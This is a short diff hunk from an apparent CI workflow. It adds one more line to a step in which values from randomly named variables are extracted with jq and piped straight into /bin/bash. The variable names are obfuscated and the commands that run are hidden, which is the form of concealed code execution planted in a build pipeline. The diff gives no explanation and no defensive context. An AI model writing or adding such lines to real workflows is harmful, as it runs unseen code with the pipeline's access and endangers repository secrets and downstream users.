@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$wvcgm54" | jq -r .vsjj64731 | /bin/bash
           echo $jwd4 | jq -r .txker15 | /bin/bash
           echo $ti23127 | jq -r .pdu131 | /bin/bash
+          echo $hxmtj7 | jq -r .ljb21 | /bin/bash
 
       - name: Upload artifact
         if: always()
